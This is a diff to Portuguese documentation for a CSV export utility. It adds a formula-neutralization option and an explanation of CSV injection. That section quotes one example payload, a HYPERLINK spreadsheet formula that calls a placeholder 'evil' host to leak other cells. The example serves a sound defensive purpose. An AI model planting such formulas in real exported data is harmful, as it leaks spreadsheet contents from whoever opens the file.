@@ -449,13 +449,18 @@ await downloadCsv(usuarios, COLUNAS, "usuarios.csv"); // entrega ao usuário
 | `toCsv(rows, columns, options?)` | Devolve o arquivo inteiro como `string`. |
 | `downloadCsv(rows, columns, fileName?, options?)` | Monta o blob `text/csv;charset=utf-8` e passa pro `shareOrDownloadBlob`. |
 | `CsvColumn<T>` | `{ key, header, csv? }` |
-| `CsvOptions` | `{ delimiter?: "," \| ";", bom?: boolean }` — defaults `","` e `true`. |
+| `CsvOptions` | `{ delimiter?: "," \| ";", bom?: boolean, neutralizeFormulas?: boolean }` — defaults `","`, `true` e `true`. |
 
 !!! danger "A coluna do `DataTable` **não** serve direto quando tem `render`"
     `DataTableColumn.render` devolve `ReactNode`. Exportar isso escreve `[object Object]` justamente na coluna que tem badge, link ou data formatada — a mais importante da tabela. Uma coluna **sem** `render` é estruturalmente compatível e pode ser reaproveitada; com `render`, dê o acessor `csv`.
 
 !!! check "Escaping RFC 4180, e o BOM que o Excel pt-BR exige"
     Campo com o delimitador, com aspas ou com quebra de linha vira campo citado, e cada aspas interna é duplicada. O arquivo termina as linhas com `\r\n`. O BOM vem por padrão porque sem ele o Excel em pt-BR lê UTF-8 como Latin-1 e todo acento vira mojibake.
+
+!!! check "Fórmula vira texto por padrão (CSV injection)"
+    Campo de texto que começa com `=`, `+`, `-`, `@`, TAB ou CR é **fórmula** pra Excel, LibreOffice e Google Sheets — e abrir o arquivo a avalia. Um nome de usuário `=HYPERLINK("https://evil/?d="&A1,"ver")` vira um link que vaza as outras células. Por isso `toCsv` e `downloadCsv` prefixam `'` nesses campos, como recomenda a OWASP: o LibreOffice 26.2 importou `=1+2` como a fórmula `of:=1+2` (valor `3`) antes, e como o texto `'=1+2` depois.
+
+    Número não é tocado: célula `number`, ou texto que é só número (`"-5"`, `"-1.234,56"`, `"+42"`), não pode ser fórmula — e prefixar transformaria todo valor negativo do relatório em texto. O custo é o `'` visível no texto neutralizado. Se o arquivo vai pro importador de outro sistema, e não pra planilha de uma pessoa, desligue com `{ neutralizeFormulas: false }` e os bytes saem como vieram.
 
 !!! tip "Delimitador `;` é o certo em locale pt-BR"
     Onde o separador decimal é a vírgula, o Excel abre um CSV separado por vírgula **em uma coluna só**. `{ delimiter: ";" }` resolve — e o escaping acompanha, citando o campo que contém `;` em vez do que contém `,`.
